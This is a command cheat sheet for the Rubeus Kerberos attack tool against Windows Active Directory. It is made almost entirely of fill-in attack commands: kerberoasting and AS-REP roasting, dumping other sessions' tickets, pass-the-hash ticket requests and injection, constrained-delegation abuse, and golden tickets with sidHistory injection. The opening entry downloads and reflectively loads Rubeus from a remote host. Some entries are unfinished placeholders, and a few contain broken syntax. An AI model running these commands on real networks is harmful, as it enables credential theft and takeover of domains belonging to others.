# rubeus

% ad, windows, rubeus

#plateform/windows #target/local 

## load rubeus from powershell
#cat/UTILS 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<dl_rubeus_path>Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
```
= dl_rubeus_path: windows/NetFramework_4.7_x64/

## execute rubeus from powershell
#cat/UTILS 
```powershell
[Rubeus.Program]::MainString("klist");
```
## Rubeus Reflection assembly
#cat/ATTACK/EXPLOIT 
```powershell
[Rubeus.Program]::Main("<rubeus_cmd>".Split())
```


## ptt - inject ticket in current session
#cat/UTILS  
```powershell
.\Rubeus.exe ptt /ticket:<ticket_file_or_blob>
```

## ptt - inject ticket in another session
#cat/UTILS 
```powershell
.\Rubeus.exe ptt /luid:<luid> /ticket:<kirbi_path_or_b64_blob>
```

## purge - tickets from current session
#cat/UTILS  
```powershell
.\Rubeus.exe purge
```

## purge - tickets from another session
#cat/UTILS 
```powershell
.\Rubeus.exe purge /luid:<luid>
```


## describe - tickets (TGT or TGS)
#cat/UTILS 
```powershell
.\Rubeus.exe describe /ticket:<kirbi_path_or_b64_blob>
```

## describe - tickets with decrypted PAC (TGT or TGS)
#cat/UTILS 
```powershell
.\Rubeus.exe describe /servicekey:<service_key> /ticket:<kirbi_path_or_b64_blob>
```

## triage - list tickets
#cat/UTILS  
```powershell
.\Rubeus.exe 
```


## triage - list tickets for a service
#cat/UTILS 
```powershell
.\Rubeus.exe triage /service:<service|ldap>
```


## klist - details of current session tickets
#cat/UTILS 
```powershell
.\Rubeus.exe klist
```

## klist - details of  other session tickets
#cat/UTILS 
```powershell
.\Rubeus.exe klist /luid:<luid>
```

## dump - extract tickets of current session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap
```

## dump - extract tgt of current session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap /service:krbtgt
```

## dump - extract tickets of another session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap /luid:<luid>
```

## dump - extract tgt of another session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap /luid:<luid> /service:krbtgt
```

## monitor - extract periodically tgt
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5>
```

## monitor - extract periodically tgt of a user
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5> /targetuser:<target_user>
```

## harvest -  monitor + auto renewal before expiration
#cat/UTILS 
```powershell
.\Rubeus.exe harvest /nowrap /interval:<sec_delai|5>
```

## asktgt - (cred)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /password:<nt_hash> /nowrap
```

## asktgt - (pth)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap
```

## asktgt - (cert)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /dc:<dc_name> /getcredentials /certificate:<file_or_b64> /password:<pfx_password> /nowrap
```

## asktgt - and inject in current session (cred)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /password:<nt_hash> /nowrap /ptt
```

## asktgt - and inject in current session (pth)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap /ptt
```

## asktgt - and inject in another session (cred)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /password:<nt_hash> /nowrap /ptt /luid:<luid>
```

## asktgt - and inject in another session (pth)
/rc4, /aes128, /aes256, /des
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap /ptt /luid:<luid>
```

## get TGT from nt_hash and inject ticket (pth)
#cat/ATTACK/CONNECT 
```
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap /ptt
```

## asktgs - and inject into current session (ptt)
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /nowrap /ptt
```

## asktgs - and inject into another session (ptt)
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /nowrap /ptt /luid:<luid>
```

## renew - and inject  
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe renew /ticket:<kirbi_path_or_b64_blob> /nowrap /ptt
```

## renew - autorenew and inject 
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe renew /ticket:<kirbi_path_or_b64_blob> /nowrap /ptt /autorenew
```


## S4U - Constrained delegation abuse (ptt)
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<kirbi_path_or_b64_blob> /impersonateuser:<user> /msdsspn:<svc|ldap>/<target> /ptt
```

## S4U - Constrained delegation abuse (pth)
#cat/ATTACK/EXPLOIT 
wmi: HOST, RPCSS
PowerShell Remoting: HOST, HTTP
WinRM: HOST, HTTP, WINRM
Scheduled Tasks: HOST
Windows File Share, also psexec: CIFS
LDAP operations, included DCSync: LDAP
Windows Remote Server Administration Tools: RPCSS, LDAP, CIFS
Golden Tickets: krbtgt
DB admin: MSSQLSvc
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain> /ptt
```


## S4U - Constrained delegation abuse with alternative spn (ptt)
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<kirbi_path_or_b64_blob> /impersonateuser:<user> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /ptt
```

## S4U - Constrained delegation abuse with alternative spn (pth)
#cat/ATTACK/EXPLOIT 
wmi: HOST, RPCSS
PowerShell Remoting: HOST, HTTP
WinRM: HOST, HTTP, WINRM
Scheduled Tasks: HOST
Windows File Share, also psexec: CIFS
LDAP operations, included DCSync: LDAP
Windows Remote Server Administration Tools: RPCSS, LDAP, CIFS
Golden Tickets: krbtgt
DB admin: MSSQLSvc
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /domain:<domain> /ptt
```

## golden - child-parent trust sidHistory injection 
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe golden /user:<username> /id:<user RID> /domain:<src_domain_fqdn> /sid:child_somain_sid> /groups:<RIDs|513> /sids:<dst_domain_sid>-<rid|519> /aes256:<krbtgt_aes_key> /ptt
```

## silver - to do
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe silver XXXXXXXXXXXXXXXX
```

## diamond - to do
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe diamond XXXXXXXXXXXXXXXX
```

## ASREPRoasting - for all users in current domain
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## ASREPRoasting - for all users in a trusted domain
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast /domain:<domain> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## ASREPRoasting - specific user
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /user:<user> /domain:<domain> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## kerberoasting - current domain
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

## Kerberoasting - and outputting on a file with a spesific format
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain>
```

## Kerberoasting - while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /rc4opsec
```

## Kerberoast - AES enabled accounts
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /aes
```
 
## Kerberoast - specific user account
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /user:<user> /simple
```


## S4U - Resource based constrained delegation
#cat/ATTACK/EXPLOIT 
HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
```
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain> /ptt
```


## Rubeus - sidHistory injection
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<src_domain_fqdn> /sid:<src_domain_sid> /sids:</sids:<dst_domain_sid>-<rid|519> /user:<name> /id:<user_rid> /ptt
```

## Misc - get ntlm hash from password
#cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe hash /password:<password>
```

## Misc - change TGS service name
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe tgssub /ticket:<kirbi_path_or_b64_blob> /altservice:<service|cifs>  /nowrap
```

## Misc - change TGS service name and inject it
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe tgssub /ticket:<kirbi_path_or_b64_blob> /altservice:<service|cifs>  /nowrap /ptt
```

## Misc - Create new session (Requires Elevation)
#cat/UTILS 
```powershell
.\Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /show
```

## Misc - current session info
#cat/UTILS 
```powershell
.\Rubeus.exe logonsession
```

## Misc - current luid
#cat/UTILS 
```powershell
.\Rubeus.exe currentluid
```

